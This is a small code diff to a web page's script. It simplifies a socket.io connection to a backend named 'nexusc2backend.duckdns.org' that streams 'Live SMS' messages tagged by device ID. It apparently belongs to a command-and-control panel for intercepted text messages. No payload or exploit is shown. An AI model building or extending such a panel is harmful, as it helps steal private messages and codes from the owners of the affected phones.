@@ -5293,9 +5293,7 @@ function openAddDbDrawer() {
     </div>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
-        const socket = io('https://nexusc2backend.duckdns.org', {
-            transports: ['websocket'],
-        });
+        const socket = io('https://nexusc2backend.duckdns.org');
         socket.on('newMessage', (msg) => {
             console.log('[Socket] Live SMS arrived:', msg);
             if (!msg || !msg.deviceId) return;
